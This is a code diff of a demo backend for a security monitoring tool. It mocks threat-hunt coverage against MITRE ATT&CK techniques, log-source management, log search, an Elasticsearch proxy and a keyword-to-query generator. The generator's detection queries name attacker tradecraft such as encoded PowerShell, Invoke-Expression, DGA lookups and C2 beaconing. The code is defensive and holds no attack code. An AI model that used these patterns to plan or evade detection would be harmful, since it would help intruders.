+        {id:'T1485',name:'Data Destruction'},{id:'T1489',name:'Service Stop'},{id:'T1486',name:'Ransomware'},{id:'T1490',name:'Inhibit Recovery'},{id:'T1495',name:'Firmware Corrupt'}] },
+    ].map(tac => ({
+      ...tac,
+      coverage: Math.round(tac.techniques.filter((t: any) => covered.includes(t.id)).length / tac.techniques.length * 100),
+      techniques: tac.techniques.map((t: any) => ({
+        ...t,
+        status: frequent.includes(t.id) ? 'frequently_hunted' : covered.includes(t.id) ? 'covered' : 'untested',
+        run_count: frequent.includes(t.id) ? 6 : covered.includes(t.id) ? 2 : 0,
+      })),
+    }));
+    return ok({ tactics, overall_coverage: 27, covered_count: covered.length, total_count: 50 });
+  }
+  if (p === '/hunt/notebook')                 return ok([{ id: 1, run_id: 0, content: '## Hunt Notes\n\nInvestigating C2 beaconing pattern on WORKSTATION-01.', content_type: 'note', created_by: 'analyst-1', created_at: new Date().toISOString() }]);
 
   // ── Hunt — templates with schedule/created_by ─────────────────────────────
   if (p === '/hunt/templates') return ok(HUNT_TEMPLATES_NORMALIZED);
@@ -747,33 +1858,103 @@ export function demoRoute(
   }
 
   // ── Log Sources ───────────────────────────────────────────────────────────
-  if (p === '/log-sources') return ok(D.log_sources.slice(0, 10));
+  if (!(globalThis as any).__demoLogSources) {
+    (globalThis as any).__demoLogSources = D.log_sources.map((s: any) => ({ ...s }));
+    (globalThis as any).__demoLsNextId   = 100;
+  }
+  const _demoLS: any[] = (globalThis as any).__demoLogSources;
+
+  if (p === '/log-sources' && method === 'GET') return ok(_demoLS);
+  if (p === '/log-sources' && method === 'POST') {
+    const b = JSON.parse(body || '{}');
+    const isHttp = b.source_type === 'http';
+    const newSrc = {
+      id:           (globalThis as any).__demoLsNextId++,
+      name:         b.name || 'New Source',
+      source_type:  b.source_type || 'syslog',
+      ip_address:   b.ip_address || null,
+      format:       b.format || 'auto',
+      device_type:  b.device_type || 'generic',
+      enabled:      true,
+      last_event:   null,
+      event_count:  0,
+      created_at:   new Date().toISOString(),
+      api_key:      isHttp ? `demo-key-${Math.random().toString(36).slice(2,18)}` : undefined,
+      api_key_hint: isHttp ? '…demo' : undefined,
+    };
+    _demoLS.push(newSrc);
+    return { status: 201, data: newSrc };
+  }
+  if (/^\/log-sources\/\d+$/.test(p) && method === 'PUT') {
+    const sid = parseInt(p.split('/')[2]);
+    const b   = JSON.parse(body || '{}');
+    const idx = _demoLS.findIndex((s: any) => s.id === sid);
+    if (idx !== -1) {
+      if (b.name        !== undefined) _demoLS[idx].name        = b.name;
+      if (b.device_type !== undefined) _demoLS[idx].device_type = b.device_type;
+      if (b.enabled     !== undefined) _demoLS[idx].enabled     = b.enabled;
+    }
+    return ok({ ok: true });
+  }
+  if (/^\/log-sources\/\d+$/.test(p) && method === 'DELETE') {
+    const sid = parseInt(p.split('/')[2]);
+    const idx  = _demoLS.findIndex((s: any) => s.id === sid);
+    if (idx !== -1) _demoLS.splice(idx, 1);
+    return ok({ ok: true });
+  }
 
   // ── Log Search / Live Logs ────────────────────────────────────────────────
   if (p === '/logs/search') {
-    const q   = sp.get('q') || '';
     const aid = sp.get('agent_id');
-    let arr   = [...D.endpoint_logs];
-    if (q)   arr = arr.filter((l: any) => l.log_message?.toLowerCase().includes(q.toLowerCase()));
+    const src = sp.get('source');
+    const rng = sp.get('range') || '24h';
+    const lim = parseInt(sp.get('limit') || '500');
+    const cutoffH: Record<string, number> = { '15m':0.25,'1h':1,'6h':6,'24h':24,'7d':168,'30d':720 };
+    const cutoffMs = (cutoffH[rng] ?? Infinity) * 3600000;
+    const since    = cutoffMs === Infinity ? 0 : Date.now() - cutoffMs;
+    let arr = [...DEMO_SEARCH_LOGS];
     if (aid) arr = arr.filter((l: any) => String(l.agent_id) === aid);
-    return ok({ logs: arr.slice(0, 50), total: arr.length });
+    if (src) arr = arr.filter((l: any) => l.log_source?.toLowerCase().includes(src.toLowerCase()));
+    if (since > 0) arr = arr.filter((l: any) => new Date(l.collected_at).getTime() >= since);
+    return ok({ logs: arr.slice(0, lim), total: arr.length, page: 0, has_more: false });
   }
   if (p === '/logs/stats') {
     const now = Date.now();
+    const bySrc: Record<string,number> = {};
+    const byAg:  Record<number,number> = {};
+    for (const l of DEMO_SEARCH_LOGS) { bySrc[l.log_source] = (bySrc[l.log_source]??0)+1; byAg[l.agent_id] = (byAg[l.agent_id]??0)+1; }
     return ok({
-      total_logs:     D.endpoint_logs.length * 1000,
+      total_logs:     DEMO_SEARCH_LOGS.length * 1247,
       retention_days: 90,
-      hourly_volume:  Array.from({ length: 24 }, (_, i) => ({ hour: new Date(now - (23 - i) * 3600000).toISOString(), count: Math.floor(seededRand(i * 7) * 800 + 200) })),
-      by_source:      D.log_sources.slice(0, 5).map((s: any) => ({ source: s.name ?? `source-${s.id}`, count: s.event_count ?? Math.floor(seededRand(s.id) * 50000) })),
-      by_agent:       D.agents.map((a: any) => ({ agent_id: a.id, hostname: a.hostname, count: D.endpoint_logs.filter((l: any) => l.agent_id === a.id).length })),
+      hourly_volume:  Array.from({ length: 24 }, (_, i) => ({ hour: new Date(now-(23-i)*3600000).toISOString(), count: Math.floor(seededRand(i*7)*600+120) })),
+      by_source:      Object.entries(bySrc).map(([source,count])=>({source,count})).sort((a:any,b:any)=>b.count-a.count).slice(0,8),
+      by_agent:       D.agents.map((a: any) => ({ agent_id: a.id, hostname: a.hostname, count: byAg[a.id]??0 })),
     });
   }
-  if (p === '/logs/searches')  return ok([]);
+  if (p === '/logs/searches' && method === 'GET') return ok(_savedSearches);
+  if (p === '/logs/searches' && method === 'POST') {
+    const body = typeof sp.get === 'function' ? {} : (sp as any);
+    const q: any = { id: _nextSavedId++, name: (body as any).name ?? 'Untitled', query: (body as any).query ?? '', time_range: (body as any).time_range ?? '24h', run_count: 0, last_run_at: null, created_at: new Date().toISOString() };
+    _savedSearches = [..._savedSearches, q];
+    return ok(q);
+  }
+  if (/^\/logs\/searches\/\d+$/.test(p) && method === 'DELETE') {
+    const sid = parseInt(p.split('/').pop()!);
+    _savedSearches = _savedSearches.filter((s: any) => s.id !== sid);
+    return ok({ ok: true });
+  }
+  if (/^\/logs\/searches\/\d+\/run$/.test(p) && method === 'POST') {
+    const sid  = parseInt(p.split('/')[3]);
+    const saved = _savedSearches.find((s: any) => s.id === sid);
+    if (saved) { (saved as any).run_count++; (saved as any).last_run_at = new Date().toISOString(); }
+    return ok({ logs: DEMO_SEARCH_LOGS.slice(0, 50), total: DEMO_SEARCH_LOGS.length, page: 0, has_more: false });
+  }
   if (p === '/logs/retention') return ok({ retention_days: 90 });
+  if (p === '/logs/retention' && method === 'PUT') return ok({ ok: true });
 
   // ── Risk Posture — with asset_scores ─────────────────────────────────────
   if (p === '/risk-posture')         return ok(riskPostureSnap());
-  if (p === '/risk-posture/history') return ok(D.risk_posture.slice(0, parseInt(sp.get('limit') || '30')));
+  if (p === '/risk-posture/history') return ok(riskPostureSnap().trend.slice(-(parseInt(sp.get('limit') || '30'))));
 
   // ── ITDR / DFIR — collections with label/triggered_by/agent_hostname ─────
   if (p === '/itdr/findings')     return ok({ findings: D.itdr_findings, total: D.itdr_findings.length });
@@ -1004,6 +2185,109 @@ export function demoRoute(
   if (p === '/settings/smtp') {
     if (method === 'GET') return ok({ host: '', port: '587', username: '', from_addr: '', tls: true });
     if (method === 'PUT') return demoBlock();
+  }
+
+  // ── Elasticsearch proxy (demo) ────────────────────────────────────────────
+  const DEMO_ES_INDICES = [
+    { index:'xcloak-logs-2026.07', health:'green',  status:'open', docs_count:'48231',  store_size:'124mb',  pri:2, rep:1, creation_date:'2026-07-01T00:00:00Z' },
+    { index:'xcloak-logs-2026.06', health:'green',  status:'open', docs_count:'312084', store_size:'891mb',  pri:2, rep:1, creation_date:'2026-06-01T00:00:00Z' },
+    { index:'xcloak-logs-2026.05', health:'yellow', status:'open', docs_count:'287432', store_size:'763mb',  pri:2, rep:1, creation_date:'2026-05-01T00:00:00Z' },
+    { index:'xcloak-alerts',       health:'green',  status:'open', docs_count:'1847',   store_size:'8.2mb',  pri:1, rep:1, creation_date:'2026-01-01T00:00:00Z' },
+    { index:'xcloak-agents',       health:'green',  status:'open', docs_count:'12',     store_size:'128kb',  pri:1, rep:1, creation_date:'2026-01-01T00:00:00Z' },
+    { index:'.kibana_1',           health:'yellow', status:'open', docs_count:'47',     store_size:'2.1mb',  pri:1, rep:1, creation_date:'2026-01-01T00:00:00Z' },
+  ];
+  const DEMO_ES_MAPPING = {
+    properties: {
+      id:           { type:'long' },
+      agent_id:     { type:'long' },
+      log_source:   { type:'keyword' },
+      log_message:  { type:'text', analyzer:'standard' },
+      collected_at: { type:'date', format:'strict_date_optional_time' },
+      'parsed_fields.src_ip':      { type:'ip' },
+      'parsed_fields.dst_ip':      { type:'ip' },
+      'parsed_fields.user':        { type:'keyword' },
+      'parsed_fields.process':     { type:'keyword' },
+      'parsed_fields.event_id':    { type:'keyword' },
+      'parsed_fields.auth_result': { type:'keyword' },
+      'parsed_fields.hostname':    { type:'keyword' },
+      'parsed_fields.port':        { type:'integer' },
+      'parsed_fields.method':      { type:'keyword' },
+      'parsed_fields.status_code': { type:'integer' },
+      'parsed_fields.bytes':       { type:'long' },
+      'parsed_fields.severity':    { type:'keyword' },
+    },
+  };
+
+  if (p === '/elastic/health') return ok({
+    status:'green', cluster_name:'xcloak-cluster', number_of_nodes:3,
+    active_primary_shards:8, active_shards:16, unassigned_shards:2,
+    relocating_shards:0, initializing_shards:0,
+  });
+  if (p === '/elastic/indices') return ok({ indices: DEMO_ES_INDICES });
+  if (/^\/elastic\/mappings\//.test(p)) return ok({ mapping: DEMO_ES_MAPPING });
+
+  if (p === '/elastic/query' && method === 'POST') {
+    const q = JSON.parse(body || '{}');
+    const size = Math.min(q.dsl?.size ?? 10, 200);
+    const hits = DEMO_SEARCH_LOGS.slice(0, size).map((l: any) => {
+      let pf: Record<string,any> = {};
+      try { pf = JSON.parse(l.parsed_fields || '{}'); } catch {}
+      return {
+        _index: 'xcloak-logs-2026.07',
+        _id: String(l.id),
+        _score: parseFloat((Math.random() * 0.5 + 0.5).toFixed(3)),
+        _source: { id:l.id, agent_id:l.agent_id, log_source:l.log_source, log_message:l.log_message, collected_at:l.collected_at, ...pf },
+      };
+    });
+    const hasSrcAgg  = q.dsl?.aggs?.by_source     || q.dsl?.aggs?.by_source_ip || q.dsl?.aggs?.by_src;
+    const hasHourAgg = q.dsl?.aggs?.over_time      || q.dsl?.aggs?.by_hour;
+    const hasUserAgg = q.dsl?.aggs?.by_user;
+    const srcBuckets: Record<string,number> = {};
+    for (const l of DEMO_SEARCH_LOGS) { srcBuckets[l.log_source] = (srcBuckets[l.log_source]||0)+1; }
+    const aggs = q.dsl?.aggs ? {
+      ...(hasSrcAgg ? { [Object.keys(q.dsl.aggs)[0]]: { buckets: Object.entries(srcBuckets).map(([k,v])=>({ key:k, doc_count:v })).sort((a:any,b:any)=>b.doc_count-a.doc_count).slice(0,15) } } : {}),
+      ...(hasHourAgg ? { over_time: { buckets: Array.from({length:24},(_,i)=>({ key_as_string:`2026-07-${String(14).padStart(2,'0')}T${String(23-i).padStart(2,'0')}:00:00Z`, key:Date.now()-(23-i)*3600000, doc_count:Math.floor(Math.random()*60+5) })) } } : {}),
+      ...(hasUserAgg ? { by_user: { buckets:[{key:'root',doc_count:42},{key:'admin',doc_count:31},{key:'ubuntu',doc_count:18},{key:'ec2-user',doc_count:12}] } } : {}),
+    } : undefined;
+    return ok({
+      took: Math.floor(Math.random()*30+5),
+      timed_out: false,
+      total: DEMO_SEARCH_LOGS.length,
+      hits: { total:{ value:DEMO_SEARCH_LOGS.length, relation:'eq' }, hits },
+      aggregations: q.dsl?.aggs ? aggs : undefined,
+      _shards: { total:3, successful:3, skipped:0, failed:0 },
+    });
+  }
+
+  if (p === '/elastic/explain' && method === 'POST') {
+    return ok({
+      parsed_query: { bool:{ must:[{ match:{ log_message:{ query:'failed', operator:'OR' } } }] } },
+      execution_plan: 'BooleanWeight(+log_message:failed) → TermQuery → PostingsEnum',
+      scoring: 'BM25(k1=1.2, b=0.75) — normalized TF-IDF per shard',
+      analyzer: 'standard (lowercase → ascii-fold → stemmer)',
+      optimizations: ['partial result caching','ConstantScoreWeight rewrite','skip-ahead with DISI conjunction'],
+      cost_estimate: { docs_scanned:DEMO_SEARCH_LOGS.length, shards_queried:3, estimated_ms:8 },
+    });
+  }
+
+  if (p === '/ai/es-query' && method === 'POST') {
+    const q = JSON.parse(body || '{}');
+    const prompt = (q.prompt || '').toLowerCase();
+    let dsl: any;
+    if (prompt.includes('fail') || prompt.includes('brute') || prompt.includes('auth')) {
+      dsl = { query:{ bool:{ should:[{ match_phrase:{ log_message:'Failed password' } },{ match_phrase:{ log_message:'authentication failure' } },{ term:{ 'parsed_fields.event_id':'4625' } }], minimum_should_match:1, filter:[{ range:{ collected_at:{ gte:'now-24h' } } }] } }, aggs:{ by_ip:{ terms:{ field:'parsed_fields.src_ip', size:20 } }, by_user:{ terms:{ field:'parsed_fields.user', size:10 } } }, sort:[{ collected_at:{ order:'desc' } }], size:100 };
+    } else if (prompt.includes('powershell') || prompt.includes('ps1') || prompt.includes('encoded')) {
+      dsl = { query:{ bool:{ should:[{ match_phrase:{ log_message:'powershell.exe' } },{ match_phrase:{ log_message:'Invoke-Expression' } },{ match_phrase:{ log_message:'-EncodedCommand' } },{ term:{ 'parsed_fields.event_id':'4104' } }], minimum_should_match:1 } }, sort:[{ collected_at:{ order:'desc' } }], size:50 };
+    } else if (prompt.includes('country') || prompt.includes('geo') || prompt.includes('two')) {
+      dsl = { query:{ bool:{ must:[{ range:{ collected_at:{ gte:'now-7d' } } }] } }, aggs:{ by_user:{ terms:{ field:'parsed_fields.user', size:20 }, aggs:{ by_ip:{ terms:{ field:'parsed_fields.src_ip', size:10 } } } } }, size:0 };
+    } else if (prompt.includes('dns') || prompt.includes('domain') || prompt.includes('dga')) {
+      dsl = { query:{ bool:{ filter:[{ term:{ log_source:'named' } }], should:[{ match_phrase:{ log_message:'NXDOMAIN' } }], minimum_should_match:1 } }, aggs:{ top_domains:{ terms:{ field:'parsed_fields.query_name', size:30 } } }, sort:[{ collected_at:{ order:'desc' } }], size:50 };
+    } else if (prompt.includes('c2') || prompt.includes('beacon') || prompt.includes('outbound')) {
+      dsl = { query:{ bool:{ filter:[{ range:{ collected_at:{ gte:'now-6h' } } }], should:[{ match_phrase:{ log_message:'CONNECT' } },{ match_phrase:{ log_message:'outbound' } }], minimum_should_match:1 } }, aggs:{ by_dest:{ terms:{ field:'parsed_fields.dst_ip', size:20 }, aggs:{ over_time:{ date_histogram:{ field:'collected_at', fixed_interval:'5m' } } } } }, size:0 };
+    } else {
+      dsl = { query:{ match_all:{} }, sort:[{ collected_at:{ order:'desc' } }], size:20 };
+    }
+    return ok({ dsl, explanation:`Generated ES DSL for: "${q.prompt}"`, confidence:0.87 });
   }
 
   // ── Fallback ─────────────────────────────────────────────────────────────
